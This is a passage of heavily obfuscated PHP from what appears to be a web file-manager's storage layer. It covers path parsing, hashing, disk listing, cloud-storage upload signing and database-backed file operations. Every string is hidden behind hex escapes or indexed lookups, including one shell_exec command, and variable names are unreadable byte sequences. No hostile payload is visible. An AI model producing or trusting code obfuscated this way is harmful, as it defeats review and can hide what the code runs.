"\173\x67\x72\x6f\x75\x70\122\x6f\157\164\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\165\163\145\x72\x53\150\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\162\x53\x68\141\x72\x65\114\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\141\x72\145\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\x65\111\164\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\x72\145\111\164\x65\155\114\x69\156\153\x7d"; const KOD_SEARCH = "\173\x73\x65\x61\x72\143\x68\175"; const KOD_BLOCK = "\x7b\142\154\157\143\x6b\175"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\163\145\x72\122\145\156\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\x69\166\x65\162\x7d"; public static function typeList() { $âˆÚ­ÚÙ =& $_SERVER[Ã¶¡¶„æ]; return array($âˆÚ­ÚÙ[1266] => self::KOD_SOURCE, $âˆÚ­ÚÙ[1267] => self::KOD_USER_RECYCLE, $âˆÚ­ÚÙ[1268] => self::KOD_USER_FAV, $âˆÚ­ÚÙ[1269] => self::KOD_USER_FILE_TAG, $âˆÚ­ÚÙ[1270] => self::KOD_USER_FILE_TYPE, $âˆÚ­ÚÙ[1271] => self::KOD_GROUP_ROOT_SELF, $âˆÚ­ÚÙ[1272] => self::KOD_USER_SHARE, $âˆÚ­ÚÙ[1273] => self::KOD_USER_SHARE_LINK, $âˆÚ­ÚÙ[1274] => self::KOD_USER_SHARE_TO_ME, $âˆÚ­ÚÙ[1275] => self::KOD_SHARE_ITEM, $âˆÚ­ÚÙ[1276] => self::KOD_SHARE_LINK, $âˆÚ­ÚÙ[1277] => self::KOD_SEARCH, $âˆÚ­ÚÙ[1278] => self::KOD_BLOCK, $âˆÚ­ÚÙ[1279] => self::KOD_IO, $âˆÚ­ÚÙ[1280] => self::KOD_USER_RECENT, $âˆÚ­ÚÙ[1281] => self::KOD_USER_DRIVER); } public static function parse($¸ÜĞŸÄä) { $òËÎ–¹Ÿ =& $_SERVER[Ã¶¡¶„æ]; $¸ÜĞŸÄä = self::clear($¸ÜĞŸÄä); $¸‚Á–ÖÌ = array_values(self::typeList()); preg_match($òËÎ–¹Ÿ[1282], $¸ÜĞŸÄä, $òç÷“ó¥); $ÕÍ‡ÎÓÏ = array($òËÎ–¹Ÿ[422] => !1, $òËÎ–¹Ÿ[1283] => !1, $òËÎ–¹Ÿ[419] => !1, $òËÎ–¹Ÿ[84] => $¸ÜĞŸÄä, $òËÎ–¹Ÿ[1184] => !1, $òËÎ–¹Ÿ[1183] => $òËÎ–¹Ÿ[12]); if (is_array($òç÷“ó¥) && count($òç÷“ó¥) == 5) { $”¾âòŞœ = $òËÎ–¹Ÿ[1284] . $òç÷“ó¥[2] . $òËÎ–¹Ÿ[327]; if (in_array($”¾âòŞœ, $¸‚Á–ÖÌ)) { $ÕÍ‡ÎÓÏ[$òËÎ–¹Ÿ[1184]] = $òç÷“ó¥[1]; $ÕÍ‡ÎÓÏ[$òËÎ–¹Ÿ[33]] = $”¾âòŞœ; $ÕÍ‡ÎÓÏ[$òËÎ–¹Ÿ[1285]] = substr($”¾âòŞœ, 1, -1); $ÕÍ‡ÎÓÏ[$òËÎ–¹Ÿ[399]] = $òç÷“ó¥[3]; } $ÕÍ‡ÎÓÏ[$òËÎ–¹Ÿ[1183]] = $òç÷“ó¥[4]; } $ÆÔï‹¾± = array($òËÎ–¹Ÿ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÕÍ‡ÎÓÏ[$òËÎ–¹Ÿ[1248]] = in_array($ÕÍ‡ÎÓÏ[$òËÎ–¹Ÿ[33]], $ÆÔï‹¾±); return $ÕÍ‡ÎÓÏ; } public static function isTruePath($™Í’†¾) { $ª‰±§äÊ =& $_SERVER[Ã¶¡¶„æ]; if (substr($™Í’†¾, 0, 1) != $ª‰±§äÊ[1284]) { return !0; } if (strpos($™Í’†¾, $ª‰±§äÊ[408]) === 0) { return !0; } if (strpos($™Í’†¾, $ª‰±§äÊ[1252]) === 0) { return !0; } if (strpos($™Í’†¾, $ª‰±§äÊ[1286]) === 0) { return !0; } if (strpos($™Í’†¾, $ª‰±§äÊ[1287]) === 0) { return !0; } if (strpos($™Í’†¾, $ª‰±§äÊ[1288]) === 0) { return !0; } return !1; } public static function clear($¬¿¨Ç÷‘) { $ßÊ¹ºŸ¼ =& $_SERVER[Ã¶¡¶„æ]; $¬¿¨Ç÷‘ = str_replace(array($ßÊ¹ºŸ¼[1092], $ßÊ¹ºŸ¼[231]), $ßÊ¹ºŸ¼[53], $¬¿¨Ç÷‘); $¬¿¨Ç÷‘ = str_replace($ßÊ¹ºŸ¼[97], $ßÊ¹ºŸ¼[8], $¬¿¨Ç÷‘); $®··ÏıÃ = $ßÊ¹ºŸ¼[1289]; if (substr($¬¿¨Ç÷‘, 0, 3) == $ßÊ¹ºŸ¼[1290]) { $¬¿¨Ç÷‘ = substr($¬¿¨Ç÷‘, 3); } while (strstr($¬¿¨Ç÷‘, $®··ÏıÃ)) { $¬¿¨Ç÷‘ = str_replace($®··ÏıÃ, $ßÊ¹ºŸ¼[8], $¬¿¨Ç÷‘); } $¬¿¨Ç÷‘ = preg_replace($ßÊ¹ºŸ¼[1291], $ßÊ¹ºŸ¼[8], $¬¿¨Ç÷‘); if ($¬¿¨Ç÷‘ == $ßÊ¹ºŸ¼[8]) { return $ßÊ¹ºŸ¼[8]; } $¬¿¨Ç÷‘ = rtrim($¬¿¨Ç÷‘, $ßÊ¹ºŸ¼[8]); return $¬¿¨Ç÷‘; } public static function sourceID($Ä«ØÁê) { $Ãı€Ğ— =& $_SERVER[Ã¶¡¶„æ]; $İ¿÷ìĞ´ = self::parse($Ä«ØÁê); if ($İ¿÷ìĞ´[$Ãı€Ğ—[33]] !== self::KOD_SOURCE) { show_json(LNG($Ãı€Ğ—[1292]), !1); } return $İ¿÷ìĞ´[$Ãı€Ğ—[399]]; } public static function make($úş›³ÕÇ) { if (!$úş›³ÕÇ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($úş›³ÕÇ)); } public static function makeShare($ïã ¢÷§, $şÄ®ª¼) { return self::makePath(self::KOD_SHARE_ITEM, $ïã ¢÷§, $şÄ®ª¼); } public static function makeFileTypePath($°¶ Ú‘) { return self::makePath(self::KOD_USER_FILE_TYPE, $°¶ Ú‘); } public static function makeFileTagPath($Œ»‹¤‘¯) { return self::makePath(self::KOD_USER_FILE_TAG, $Œ»‹¤‘¯); } public static function makePath($×Ô°ÇÑ·, $³¨„½íŒ = '', $‘ŸŒÚŠÕ = '') { $×Ë•‘ï =& $_SERVER[Ã¶¡¶„æ]; $òÓ€ÕËı = substr($×Ô°ÇÑ·, 1, -1); $Œ©”áÎÕ = $×Ë•‘ï[1293] . $òÓ€ÕËı . $×Ë•‘ï[1294] . $³¨„½íŒ . $×Ë•‘ï[1295]; $Œ©”áÎÕ = $‘ŸŒÚŠÕ ? $Œ©”áÎÕ . $‘ŸŒÚŠÕ . $×Ë•‘ï[8] : $Œ©”áÎÕ; return $Œ©”áÎÕ; } public static function hashPath($§åÈ”­á, $ªÑ¯ô±£ = true) { $€õú´¿» =& $_SERVER[Ã¶¡¶„æ]; $ûéÎéü– = is_array($§åÈ”­á) ? $§åÈ”­á : IO::info($§åÈ”­á); $£¿—½ñ— = _get($ûéÎéü–, $€õú´¿»[1296], $€õú´¿»[12]); if (!$£¿—½ñ— && isset($ûéÎéü–[$€õú´¿»[402]])) { $ûéÎéü– = IO::info(KodIO::make($ûéÎéü–[$€õú´¿»[402]])); $£¿—½ñ— = _get($ûéÎéü–, $€õú´¿»[1296], $€õú´¿»[12]); } if (!$£¿—½ñ— && $ªÑ¯ô±£) { $è•º¯¹  = KodIO::parse($ûéÎéü–[$€õú´¿»[84]]); if (!$è•º¯¹ [$€õú´¿»[33]]) { $£¿—½ñ— = IO::hashSimple($ûéÎéü–[$€õú´¿»[84]]); } } if (!$£¿—½ñ—) { $£¿—½ñ— = md5($ûéÎéü–[$€õú´¿»[84]] . $ûéÎéü–[$€õú´¿»[76]] . $ûéÎéü–[$€õú´¿»[85]]); } return $£¿—½ñ—; } public static function hashPathSafe($èàËØğï, $ğ£¹øØ² = true) { $ ¿úÎí¹ =& $_SERVER[Ã¶¡¶„æ]; $Ô¥ãÎ¤Ÿ = self::hashPath($èàËØğï, $ğ£¹øØ²); return md5($Ô¥ãÎ¤Ÿ . $ ¿úÎí¹[1297] . Model($ ¿úÎí¹[776])->get($ ¿úÎí¹[777])); } public static function initSystemPath() { $úº­À§‚ =& $_SERVER[Ã¶¡¶„æ]; if (defined($úº­À§‚[1298])) { return; } define($úº­À§‚[1298], self::systemPath($úº­À§‚[1299])); define($úº­À§‚[1300], self::systemPath($úº­À§‚[1301])); define($úº­À§‚[1302], self::systemPath($úº­À§‚[1303])); define($úº­À§‚[1304], self::systemPath($úº­À§‚[1305])); IOHistory::bindEvent(); } public static function systemPath($¡•Ïùšº) { $ÓÄıÓ•ı =& $_SERVER[Ã¶¡¶„æ]; $ñ¤Ú°Ú = $ÓÄıÓ•ı[1306] . ucfirst($¡•Ïùšº); $Ú§ĞÏÙå = Model($ÓÄıÓ•ı[776])->get($ñ¤Ú°Ú); if ($Ú§ĞÏÙå) { return $Ú§ĞÏÙå; } if ($¡•Ïùšº == $ÓÄıÓ•ı[1299]) { $Ú§ĞÏÙå = self::make(Model($ÓÄıÓ•ı[831])->systemRootPathAdd($ÓÄıÓ•ı[544])); } else { $Ú§ĞÏÙå = self::systemPath($ÓÄıÓ•ı[1299]); $Êùó‰ = self::sourceID($Ú§ĞÏÙå); $Ú§ĞÏÙå = self::make(Model($ÓÄıÓ•ı[831])->mkdir($Êùó‰, $¡•Ïùšº)); } Model($ÓÄıÓ•ı[776])->set($ñ¤Ú°Ú, $Ú§ĞÏÙå); return $Ú§ĞÏÙå; } public static function systemFolder($åÈê½Ì) { $•ı‘ñÛœ = IO_PATH_SYSTEM_SOURCE . $åÈê½Ì; $×ä·£‚Á = Cache::get($•ı‘ñÛœ); if (!$×ä·£‚Á) { $À³”ëı = IO::infoFull($•ı‘ñÛœ); if (!$À³”ëı) { $×ä·£‚Á = IO::mkdir($•ı‘ñÛœ, REPEAT_SKIP); } else { $×ä·£‚Á = $À³”ëı[$_SERVER[Ã¶¡¶„æ][84]]; } Cache::set($•ı‘ñÛœ, $×ä·£‚Á, 3600 * 10); } return $×ä·£‚Á; } public static function defaultDriver() { return Model($_SERVER[Ã¶¡¶„æ][773])->defaultDriver(); } public static function defaultIO() { $ÜÛŞı¢í =& $_SERVER[Ã¶¡¶„æ]; $³ÚœÃ‘‹ = self::defaultDriver(); return $ÜÛŞı¢í[1307] . $³ÚœÃ‘‹[$ÜÛŞı¢í[399]] . $ÜÛŞı¢í[1295]; } public static function defaultDriverInit() { static $Ì½”ĞÍõ = false; if ($Ì½”ĞÍõ) { return $Ì½”ĞÍõ; } $Ì½”ĞÍõ = IO::init(self::defaultIO()); return $Ì½”ĞÍõ; } public static function fileTypeList() { $¤è±àÏŸ =& $_SERVER[Ã¶¡¶„æ]; $Ã×²ÈÆ = $GLOBALS[$¤è±àÏŸ[6]][$¤è±àÏŸ[1308]]; foreach ($Ã×²ÈÆ as $Ä±‰Ç–Ü => $Ä›åí¼) { $ş¤×Š­ = $¤è±àÏŸ[1309] . $Ä±‰Ç–Ü; $êìè½°Ø = LNG($ş¤×Š­); if ($ş¤×Š­ != $êìè½°Ø) { $Ã×²ÈÆ[$Ä±‰Ç–Ü][$¤è±àÏŸ[32]] = $êìè½°Ø; } } return $Ã×²ÈÆ; } public static function diskList($Íêó­Ô² = true) { $ß¸üî¢¯ = $_SERVER[Ã¶¡¶„æ][1310]; if ($Íêó­Ô²) { $Ç¯½§¥ğ = Cache::get($ß¸üî¢¯); if (is_array($Ç¯½§¥ğ)) { return $Ç¯½§¥ğ; } } $Ç¯½§¥ğ = self::diskListGet(); Cache::set($ß¸üî¢¯, $Ç¯½§¥ğ, 60); return $Ç¯½§¥ğ; } public static function diskListGet() { $µÆê’¹µ =& $_SERVER[Ã¶¡¶„æ]; $Èæ‡î›® = array(); if ($GLOBALS[$µÆê’¹µ[6]][$µÆê’¹µ[1311]] == $µÆê’¹µ[1312]) { $â©Ñ—Ì = $µÆê’¹µ[1313]; for ($¹Àøí¢å = 0; $¹Àøí¢å < strlen($â©Ñ—Ì); $¹Àøí¢å++) { $‚æ¯ú = $â©Ñ—Ì[$¹Àøí¢å] . $µÆê’¹µ[1314]; if (file_exists($‚æ¯ú)) { $Èæ‡î›®[] = $‚æ¯ú; } } return $Èæ‡î›®; } if (!function_exists($µÆê’¹µ[98])) { $Èæ‡î›®[] = $µÆê’¹µ[849]; return $Èæ‡î›®; } $¦•„ÖÂã = explode($µÆê’¹µ[231], shell_exec($µÆê’¹µ[1315])); array_shift($¦•„ÖÂã); array_pop($¦•„ÖÂã); $Ù¼’óï© = array($µÆê’¹µ[1316], $µÆê’¹µ[1317], $µÆê’¹µ[1318], $µÆê’¹µ[1319], $µÆê’¹µ[1320], $µÆê’¹µ[1321], $µÆê’¹µ[1322], $µÆê’¹µ[1323]); foreach ($¦•„ÖÂã as $Ê‡şå³Í) { $óİ¿Ê¶š = preg_split($µÆê’¹µ[1324], $Ê‡şå³Í); $‚æ¯ú = $óİ¿Ê¶š[count($óİ¿Ê¶š) - 1]; if (!strstr($óİ¿Ê¶š[0], $µÆê’¹µ[1325]) || !$‚æ¯ú) { continue; } $ÛÎ‚‹ï = rtrim($‚æ¯ú, $µÆê’¹µ[8]) . $µÆê’¹µ[8]; if (in_array($ÛÎ‚‹ï, $Ù¼’óï©)) { continue; } $Èæ‡î›®[] = $ÛÎ‚‹ï; } return $Èæ‡î›®; } public static function isSameDisk($×¥ò°íÒ, $Û¼ó†Œ) { $·ì¦ºŠ€ =& $_SERVER[Ã¶¡¶„æ]; if ($GLOBALS[$·ì¦ºŠ€[6]][$·ì¦ºŠ€[1311]] == $·ì¦ºŠ€[1312]) { return strtolower(substr($×¥ò°íÒ, 0, 1)) == strtolower(substr($Û¼ó†Œ, 0, 1)); } $ÒÒ’Ä¥™ = self::diskList(); $ÃøÜÉ…£ = !1; $¶üÌÂÂİ = !1; sort($ÒÒ’Ä¥™); $ÒÒ’Ä¥™ = array_reverse($ÒÒ’Ä¥™); $×¥ò°íÒ = rtrim($×¥ò°íÒ, $·ì¦ºŠ€[8]) . $·ì¦ºŠ€[8]; $Û¼ó†Œ = rtrim($Û¼ó†Œ, $·ì¦ºŠ€[8]) . $·ì¦ºŠ€[8]; foreach ($ÒÒ’Ä¥™ as $û·í©ÀÕ) { $Û¿ïëã… = strlen($û·í©ÀÕ); if (!$ÃøÜÉ…£ && substr($×¥ò°íÒ, 0, $Û¿ïëã…) == $û·í©ÀÕ) { $ÃøÜÉ…£ = $û·í©ÀÕ; } if (!$¶üÌÂÂİ && substr($Û¼ó†Œ, 0, $Û¿ïëã…) == $û·í©ÀÕ) { $¶üÌÂÂİ = $û·í©ÀÕ; } if ($ÃøÜÉ…£ && $¶üÌÂÂİ) { break; } } return $ÃøÜÉ…£ === $¶üÌÂÂİ; } public static function transferType($´Îªçê¡, $ƒîºœ©) { $‘ÔÖ‚ÚÚ =& $_SERVER[Ã¶¡¶„æ]; $ˆêï¤¡¯ = self::driverType($´Îªçê¡); $£ŠÆ›Ûİ = self::driverType($ƒîºœ©); if ($ˆêï¤¡¯[$‘ÔÖ‚ÚÚ[33]] == $£ŠÆ›Ûİ[$‘ÔÖ‚ÚÚ[33]] && $ˆêï¤¡¯[$‘ÔÖ‚ÚÚ[1326]] == $£ŠÆ›Ûİ[$‘ÔÖ‚ÚÚ[1326]]) { return $‘ÔÖ‚ÚÚ[1327]; } if ($ˆêï¤¡¯[$‘ÔÖ‚ÚÚ[33]] == $‘ÔÖ‚ÚÚ[882] && $£ŠÆ›Ûİ[$‘ÔÖ‚ÚÚ[33]] == $‘ÔÖ‚ÚÚ[106]) { return $‘ÔÖ‚ÚÚ[1209]; } if ($ˆêï¤¡¯[$‘ÔÖ‚ÚÚ[33]] == $‘ÔÖ‚ÚÚ[106] && $£ŠÆ›Ûİ[$‘ÔÖ‚ÚÚ[33]] == $‘ÔÖ‚ÚÚ[882]) { return $‘ÔÖ‚ÚÚ[107]; } return $‘ÔÖ‚ÚÚ[1328]; } public static function driverType($½úªÚ§¡) { $¡öŒ×­î =& $_SERVER[Ã¶¡¶„æ]; $˜”òüáí = str_replace($¡öŒ×­î[1329], $¡öŒ×­î[12], strtolower($½úªÚ§¡->getType())); if ($˜”òüáí == $¡öŒ×­î[764] || $˜”òüáí == $¡öŒ×­î[1330] || $˜”òüáí == $¡öŒ×­î[1331]) { $½úªÚ§¡ = self::defaultDriverInit(); } else { if ($˜”òüáí == $¡öŒ×­î[1219] || $˜”òüáí == $¡öŒ×­î[1332]) { $½úªÚ§¡ = IO::init($½úªÚ§¡->pathParse[$¡öŒ×­î[1165]]); } } $³Áèöˆ© = $½úªÚ§¡->path; $˜”òüáí = str_replace($¡öŒ×­î[1329], $¡öŒ×­î[12], strtolower($½úªÚ§¡->getType())); if ($˜”òüáí == $¡öŒ×­î[106]) { return array($¡öŒ×­î[33] => $¡öŒ×­î[106], $¡öŒ×­î[1326] => $¡öŒ×­î[12], $¡öŒ×­î[84] => $³Áèöˆ©); } return array($¡öŒ×­î[33] => $¡öŒ×­î[882], $¡öŒ×­î[1326] => $½úªÚ§¡->pathDriver, $¡öŒ×­î[84] => $³Áèöˆ©); } public static function pathDriverType($’´¬ñíû) { return $’´¬ñíû ? self::driverType(IO::init($’´¬ñíû)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($»¢öèâÆ) { parent::__construct($»¢öèâÆ); $this->signatureVersion($_SERVER[Ã¶¡¶„æ][216]); } public function uploadFormData($úÅÊ¸ôû, $é’Í¡£ª = 3600) { $Ÿ¶¯æê© =& $_SERVER[Ã¶¡¶„æ]; $ÒÔÛ¹Â‹ = $Ÿ¶¯æê©[198]; $ÜÆêï¤ = $Ÿ¶¯æê©[232]; $îÇòåó = $Ÿ¶¯æê©[1333]; $˜ß ĞÀ = gmdate($Ÿ¶¯æê©[1334], time() + $é’Í¡£ª); $¾Úçßø = (string) time() . $Ÿ¶¯æê©[71] . (string) (time() + $é’Í¡£ª); $·Î¨Ãº¿ = array($Ÿ¶¯æê©[1335] => $˜ß ĞÀ, $Ÿ¶¯æê©[1336] => array(array($Ÿ¶¯æê©[1337] => $ÒÔÛ¹Â‹), array($Ÿ¶¯æê©[1338] => $this->bucket), array($Ÿ¶¯æê©[1339], $Ÿ¶¯æê©[1340], $Ÿ¶¯æê©[12]), array($Ÿ¶¯æê©[1341] => $îÇòåó), array($Ÿ¶¯æê©[1342] => $ÜÆêï¤), array($Ÿ¶¯æê©[1343] => $this->accessKey), array($Ÿ¶¯æê©[1344] => $¾Úçßø))); $·Î¨Ãº¿ = json_encode($·Î¨Ãº¿); $ÈğŠ¦®— = hash_hmac($Ÿ¶¯æê©[232], $¾Úçßø, $this->secret); $ü˜ñÁó‡ = sha1($·Î¨Ãº¿); $ÎÍì¯»Ö = hash_hmac($Ÿ¶¯æê©[232], $ü˜ñÁó‡, $ÈğŠ¦®—); $Çö®êÆä = array($Ÿ¶¯æê©[1337] => $ÒÔÛ¹Â‹, $Ÿ¶¯æê©[1341] => $îÇòåó, $Ÿ¶¯æê©[1345] => base64_encode($·Î¨Ãº¿), $Ÿ¶¯æê©[1342] => $ÜÆêï¤, $Ÿ¶¯æê©[1343] => $this->accessKey, $Ÿ¶¯æê©[1346] => $¾Úçßø, $Ÿ¶¯æê©[1347] => $ÎÍì¯»Ö, $Ÿ¶¯æê©[181] => $this->getHost()); return $Çö®êÆä; } public function fileOutLink($ª€ıÌÏù) { $ÊŸş®íø =& $_SERVER[Ã¶¡¶„æ]; if (substr($ª€ıÌÏù, 0, 7) == $ÊŸş®íø[1348]) { $ª€ıÌÏù = $ÊŸş®íø[1349] . substr($ª€ıÌÏù, 7); } header($ÊŸş®íø[161] . $ª€ıÌÏù); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($òÍ•×¯«) { $this->pathParse = $òÍ•×¯«; $this->model = Model($_SERVER[Ã¶¡¶„æ][1350]); } public function getPath($ªŠé’¶) { return trim($ªŠé’¶, $_SERVER[Ã¶¡¶„æ][8]); } public function pathFather($öŸíĞ¬Ã) { $ÖÒ–¸àË = $this->parse($öŸíĞ¬Ã); $ÖÒ–¸àË = $this->infoSimple($öŸíĞ¬Ã); return $ÖÒ–¸àË ? $ÖÒ–¸àË[$_SERVER[Ã¶¡¶„æ][432]] : !1; } public function pathThis($œ¨ŞÙìú) { $¢°å³Ëİ = $this->infoSimple($œ¨ŞÙìú); return $¢°å³Ëİ ? $¢°å³Ëİ[$_SERVER[Ã¶¡¶„æ][32]] : !1; } public function getPathOuter($Õ´ëÍ‹Í) { if (!$Õ´ëÍ‹Í) { return $Õ´ëÍ‹Í; } $£õóõ¿ö = $this->parse($Õ´ëÍ‹Í); return KodIO::make($£õóõ¿ö[$_SERVER[Ã¶¡¶„æ][399]]); } public function copyFolderFromIO($´³Úúä“, $Í¯«˜ã, $¿ì½Œåï, $µ¬–Æ”, $®È‹£øí) { $Û„°Í÷ç = $this->model->copyFolderFromIO($´³Úúä“, $Í¯«˜ã, $¿ì½Œåï, $µ¬–Æ”, $®È‹£øí); return KodIO::make($Û„°Í÷ç); } public function isParentOf($ÔÇ–µµº, $Í™§É›Ü) { return $this->model->isParentOf($ÔÇ–µµº, $Í™§É›Ü); } public function mkfile($á›Ú‘Ô„, $ûõ½Ó±£ = '', $”£¼¯ºß = REPEAT_RENAME) { $±Ûöæ•Î =& $_SERVER[Ã¶¡¶„æ]; $Êï¡î›è = $this->parse($á›Ú‘Ô„); $á›Ú‘Ô„ = $Êï¡î›è[$±Ûöæ•Î[399]]; for ($ößšÎÅÃ = 0; $ößšÎÅÃ < count($Êï¡î›è[$±Ûöæ•Î[1351]]); $ößšÎÅÃ++) { $ÙÀÙæËˆ = $Êï¡î›è[$±Ûöæ•Î[1351]][$ößšÎÅÃ]; if ($ößšÎÅÃ == count($Êï¡î›è[$±Ûöæ•Î[1351]]) - 1) { $á›Ú‘Ô„ = $this->model->mkfile($á›Ú‘Ô„, $ÙÀÙæËˆ, $ûõ½Ó±£, $”£¼¯ºß); break; } $á›Ú‘Ô„ = $this->model->mkdir($á›Ú‘Ô„, $ÙÀÙæËˆ, REPEAT_SKIP); } return $this->getPathOuter($á›Ú‘Ô„); } public function mkdir($Úì Àº, $É”â¿÷ = REPEAT_SKIP) { $³Æå§éı =& $_SERVER[Ã¶¡¶„æ]; $¹Äé¬à” = $this->parse($Úì Àº); $Úì Àº = $¹Äé¬à”[$³Æå§éı[399]]; for ($šı¥†€ã = 0; $šı¥†€ã < count($¹Äé¬à”[$³Æå§éı[1351]]); $šı¥†€ã++) { $†“éÛ†¥ = $¹Äé¬à”[$³Æå§éı[1351]][$šı¥†€ã]; $Úì Àº = $this->model->mkdir($Úì Àº, $†“éÛ†¥, $É”â¿÷); } return $this->getPathOuter($Úì Àº); } public function copyFile($”›®ì³×, $àÌŸº”ˆ, $ñÈ±¯Ä = REPEAT_REPLACE) { $ÌúºÊñ½ =& $_SERVER[Ã¶¡¶„æ]; $ñç¶é· = $this->parse($àÌŸº”ˆ); $åÀéüØ = $this->model->copy($”›®ì³×, $ñç¶é·[$ÌúºÊñ½[399]], $ñÈ±¯Ä, $ñç¶é·[$ÌúºÊñ½[84]]); return $åÀéüØ ? $this->getPathOuter($åÀéüØ) : !1; } public function moveFile($Äæû÷î, $ë‘â——×, $ì›õÒå¶ = REPEAT_REPLACE) { $ ÔÅĞæ» =& $_SERVER[Ã¶¡¶„æ]; $‰Ú­ùğ = $this->parse($ë‘â——×); $¶Â¹‚ãÅ = $this->model->move($Äæû÷î, $‰Ú­ùğ[$ ÔÅĞæ»[399]], $ì›õÒå¶, $‰Ú­ùğ[$ ÔÅĞæ»[84]]); return $¶Â¹‚ãÅ ? $this->getPathOuter($¶Â¹‚ãÅ) : !1; } public function copy($Ğæ‚ì”, $úşï™Î, $Á ‡İ¶œ = REPEAT_REPLACE, $ù±È€à‘ = false) { $šôşãĞ¯ = $this->parse($úşï™Î); $å¨Œ¨‘  = $this->model->copy($Ğæ‚ì”, $šôşãĞ¯[$_SERVER[Ã¶¡¶„æ][399]], $Á ‡İ¶œ, $ù±È€à‘); return $å¨Œ¨‘  ? $this->getPathOuter($å¨Œ¨‘ ) : !1; } public function moveSameAllow() { } public function move($€âèáÓÏ, $é„¤ˆŞ, $ŞÒ´Ø£À = REPEAT_REPLACE, $‚Õ”ş = false) { $Â…ôğ‰ğ = $this->parse($é„¤ˆŞ); $ŸÂÛÕ»í = $this->model->move($€âèáÓÏ, $Â…ôğ‰ğ[$_SERVER[Ã¶¡¶„æ][399]], $ŞÒ´Ø£À, $‚Õ”ş); return $ŸÂÛÕ»í ? $this->getPathOuter($ŸÂÛÕ»í) : !1; } public function remove($Á…ïÇÁÃ, $Ï¦Ïáåª = true) { return $this->model->remove($Á…ïÇÁÃ, $Ï¦Ïáåª); } public function rename($±ƒ«‹¦ï, $£ƒ†ÕÆ¦) { $¾òõãé = $this->model->rename($±ƒ«‹¦ï, $£ƒ†ÕÆ¦); return $¾òõãé ? $this->getPathOuter($±ƒ«‹¦ï) : $¾òõãé; } public function size($„½¥×ó) { $¡ÔÁëÛ® = $this->infoSimple($„½¥×ó); return $¡ÔÁëÛ® ? $¡ÔÁëÛ®[$_SERVER[Ã¶¡¶„æ][76]] : 0; } public function infoSimple($õé«¼…¶) { return $this->model->sourceInfo($õé«¼…¶); } public function info($®»›¼¯À) { return $this->infoParse($®»›¼¯À); } public function infoAuth($ƒö¹¾ãŒ) { return $this->infoParse($ƒö¹¾ãŒ, !1, !0); } public function infoWithChildren($ÙÆ®¶ÔÚ) { return $this->infoParse($ÙÆ®¶ÔÚ, !0); } protected function infoParse($Ä²¨á‹å, $¥ÆÅ‹öš = false, $ûíÖØî = false) { if (!$¥ÆÅ‹öš) { return $this->model->pathInfo($Ä²¨á‹å, $ûíÖØî); } return $this->model->pathInfoMore($Ä²¨á‹å); } public function infoFull($‡Æåéú×) { $Ÿ•»Ã¿¹ =& $_SERVER[Ã¶¡¶„æ]; $¨Õùèò = explode($Ÿ•»Ã¿¹[8], $‡Æåéú×); $‰îĞ¾Ó­ = implode($Ÿ•»Ã¿¹[8], array_splice($¨Õùèò, 1)); return $this->model->pathInfoByPath($¨Õùèò[0], $‰îĞ¾Ó­); } public function hashSimple($œ¾Íê×¾) { $öÂıı¨š =& $_SERVER[Ã¶¡¶„æ]; $¹üÚÁ¢Æ = $this->infoWithChildren($œ¾Íê×¾); return $¹üÚÁ¢Æ[$öÂıı¨š[170]][$öÂıı¨š[177]]; } public function hashMd5($ ‹‚Úì) { $ª²»…£¬ =& $_SERVER[Ã¶¡¶„æ]; $Éß†¶‹ = $this->infoWithChildren($ ‹‚Úì); return $Éß†¶‹[$ª²»…£¬[170]][$ª²»…£¬[176]]; } public function exist($¯˜Î£İ) { $”¡Ïò‡Ô =& $_SERVER[Ã¶¡¶„æ]; $óÖ†‘ôÊ = $this->parse($¯˜Î£İ); if (!$óÖ†‘ôÊ[$”¡Ïò‡Ô[84]]) { return $this->isFile($¯˜Î£İ) || $this->isFolder($¯˜Î£İ); } $‚Ò‹²´í = array($”¡Ïò‡Ô[401] => $óÖ†‘ôÊ[$”¡Ïò‡Ô[399]], $”¡Ïò‡Ô[32] => $óÖ†‘ôÊ[$”¡Ïò‡Ô[84]]); $´ì¤çé = $this->model->where($‚Ò‹²´í)->find(); return $´ì¤çé ? !0 : !1; } public function isFile($Ñå–ÀÏ¯) { $çİÓÃÕ¬ =& $_SERVER[Ã¶¡¶„æ]; $—¬®”æÛ = $this->infoSimple($Ñå–ÀÏ¯); return $—¬®”æÛ && $—¬®”æÛ[$çİÓÃÕ¬[410]] == $çİÓÃÕ¬[88] ? !1 : !0; } public function isFolder($†ÇêÌ“Ã) { $—ºåÚß¥ =& $_SERVER[Ã¶¡¶„æ]; $º·áúöÆ = $this->infoSimple($†ÇêÌ“Ã); return $º·áúöÆ && $º·áúöÆ[$—ºåÚß¥[410]] == $—ºåÚß¥[88] ? !0 : !1; } public function listPath($ÆÑ½óÀÔ, $­‡ê½ø… = false) { $¯ˆœ†¾ı =& $_SERVER[Ã¶¡¶„æ]; if ($ÆÑ½óÀÔ == $¯ˆœ†¾ı[12]) { return !1; } $¼ºÔ¤« = array($¯ˆœ†¾ı[401] => $ÆÑ½óÀÔ); if ($­‡ê½ø…) { return $this->model->listSource($¼ºÔ¤«, -1); } return $this->model->listSource($¼ºÔ¤«); } public function has($÷…ôñğÇ, $´£½êĞ = false, $áÃ•ø£È = null) { $ÓÙÔ˜² =& $_SERVER[Ã¶¡¶„æ]; $­àÍ™àÃ = $this->infoWithChildren($÷…ôñğÇ); if ($´£½êĞ) { return array($ÓÙÔ˜²[208] => $­àÍ™àÃ[$ÓÙÔ˜²[208]], $ÓÙÔ˜²[207] => $­àÍ™àÃ[$ÓÙÔ˜²[207]]); } return $áÃ•ø£È ? $­àÍ™àÃ[$ÓÙÔ˜²[208]] : $­àÍ™àÃ[$ÓÙÔ˜²[207]]; } public function listAll($µí€å€¸) { $‚ëÍ®© = 